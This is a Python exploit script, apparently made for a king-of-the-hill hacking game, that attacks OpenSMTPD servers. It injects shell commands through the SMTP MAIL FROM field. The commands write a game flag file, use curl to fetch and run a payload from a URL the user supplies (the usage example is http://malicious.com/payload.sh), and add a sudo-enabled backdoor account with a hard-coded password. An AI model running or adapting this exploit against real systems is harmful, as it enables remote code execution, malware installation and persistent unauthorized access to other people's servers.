#!/usr/bin/env python3

import sys
import socket

def exploit(victim_ip, victim_port, payload_url):
    commands = [
        'touch /home/$USER/koth.txt && echo "cd1a5cf3-70b4-403b-a60e-cd883667dfa2" > /home/$USER/koth.txt',
        f'curl {payload_url} -o payload.sh && chmod +x ./payload.sh && ./payload.sh',
        'sudo useradd -m -s /bin/bash datadag && echo "datadag:CCSOdog123" | sudo chpasswd && sudo usermod -aG sudo datadag',
    ]

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((victim_ip, int(victim_port)))

        res = s.recv(1024).decode(errors='ignore')
        if 'OpenSMTPD' not in res:
            print('[!] No vulnerable SMTP server found')
            print(f'[!] Received: {res}')
            s.close()
            sys.exit(1)

        print('[*] Found a vulnerable SMTP server!')

        s.send(b'HELO x\r\n')
        res = s.recv(1024).decode(errors='ignore')
        if '250' not in res:
            print('[!] Error connecting, expected 250 ')
            print(f'[!] Received: {res}')
            s.close()
            sys.exit(1)

        for cmd in commands:
            payload = f"; {cmd};"

            print(f"[*] Executing: {cmd} ")
            s.send(bytes(f'MAIL FROM:<{payload}>\r\n', 'utf-8'))
            res = s.recv(1024).decode(errors='ignore')

            if '250' not in res:
                print('[!] Command execution failed')
                print(f'[!] Received: {res}')
                s.close()
                sys.exit(1)

            s.send(b'RCPT TO:<root>\r\n')
            s.recv(1024)
            s.send(b'DATA\r\n')
            s.recv(1024)
            s.send(b'\r\nxxx\r\n.\r\n')
            s.recv(1024)

            print('[*] Command executed successfully\n')

        s.send(b'QUIT\r\n')
        s.recv(1024)
        s.close()
        print('[*] Exploit completed successfully.')

    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <victim_ip> <victim_port> <payload_url>")
        print(f"Example: {sys.argv[0]} 192.168.1.100 25 http://malicious.com/payload.sh")
        sys.exit(1)

    victim_ip, victim_port, payload_url = sys.argv[1:4]

    print(f"[*] Attacking {victim_ip}:{victim_port} with payload from {payload_url} 🎯")
    exploit(victim_ip, victim_port, payload_url)
